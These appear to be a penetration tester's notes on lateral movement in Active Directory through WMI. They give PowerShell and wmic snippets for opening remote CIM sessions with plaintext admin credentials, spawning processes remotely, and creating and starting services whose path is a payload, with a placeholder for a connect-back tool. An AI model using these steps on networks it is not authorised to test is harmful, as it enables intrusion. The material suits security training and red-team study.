# AD Lateral Movement - WMI

Windows Management Instrumentation (WMI) is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices. Not to be confused with `wmic` see [[WMI-Commands]] for more uses of WMI's Command Line utility. Regardless WMI allows administrators to perform standard management tasks, therefore a utility to lateral movement.


## Connecting to WMI From Powershell

-   **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
-   **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

Create a PSCredential object 
```powershell
$username = 'Administrator';
$password = 'admin';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
Store sessions with `New-CimSessionOption` 
```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName <computer-name> -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

## Remote Process Creation Using WMI

**Requirements**
-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
-   **Group Memberships**: 
	- Administrators

Remotely spawn a process from Powershell by sending a WMI request to the Win32_process class to spawn the process under the session we previously created 
```powershell
$Command = "powershell.exe ..." # Enter a command here
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -arguments @{ CommandLine = $Command }
```
Output of command and processs create will both be silent. Legacy system can use `wmic.exe`:
```powershell
wmic.exe /user:Administrator /password:admin /node:<target computer name> process call create "cmd.exe /c <whatever tool you have on the target to connect back!>"
```

## Remote Service Creation with WMI

**Requirements**
-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
-   **Group Memberships**: 
	- Administrators

Create a sevice with Powershell; Importantly `PathName` is your payload and the `ServiceType` completed below and is a `Win32OwnProcess` Starting a service in a new Process. The `Name` and `DisplayName` are just the naming of this SErvices
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguements @{
Name = "";
DisplayName = "";
PathName = ""; 
ServiceType = [byte]::Parse("16");
StartMode = "Manual"
}
```
Use the service name to start like so:
```powershell
$Service = Get-CimInstance -CimSession $SEssion -ClassName Win32_SErvice -filter "Name LIKE '<service name>'" 

Invoke-CimMethod -InputObject $Service -MethodName StartService
# Stop and delte with the following:
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```
